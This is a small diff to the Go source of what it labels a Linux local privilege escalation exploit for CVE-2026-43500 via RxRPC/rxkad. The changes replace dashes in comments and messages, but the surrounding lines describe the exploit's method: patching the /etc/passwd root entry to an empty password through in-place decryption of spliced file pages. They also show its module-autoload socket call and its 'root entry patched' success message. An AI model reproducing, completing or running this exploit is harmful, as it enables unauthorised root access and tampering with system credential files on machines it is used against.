@@ -1,6 +1,6 @@
 package main
 
-// RxRPC/rxkad LPE path — CVE-2026-43500
+// RxRPC/rxkad LPE path - CVE-2026-43500
 // Patches /etc/passwd root entry to "root::0:0:GGGGGG:/root:/bin/bash"
 // by triggering rxkad_verify_packet_1() in-place decryption on splice'd
 // file pages. Three overlapping 8-byte writes with last-write-wins ordering.
@@ -390,7 +390,7 @@ func rxrpcLPE() bool {
 	// Autoload rxrpc module.
 	dummy, _, errno := syscall.Syscall(syscall.SYS_SOCKET, afRxrpc, syscall.SOCK_DGRAM, syscall.AF_INET)
 	if errno != 0 {
-		fmt.Fprintf(os.Stderr, "[!] socket(AF_RXRPC): %v — module not available\n", errno)
+		fmt.Fprintf(os.Stderr, "[!] socket(AF_RXRPC): %v - module not available\n", errno)
 		return false
 	}
 	syscall.Close(int(dummy))
@@ -502,6 +502,6 @@ func rxrpcLPE() bool {
 	if !ok2 {
 		fmt.Fprintln(os.Stderr, "[!] post-trigger sanity check failed"); return false
 	}
-	fmt.Fprintln(os.Stderr, "\n[!!!] HIT — root entry patched, empty passwd, uid=0")
+	fmt.Fprintln(os.Stderr, "\n[!!!] HIT - root entry patched, empty passwd, uid=0")
 	return true
 }
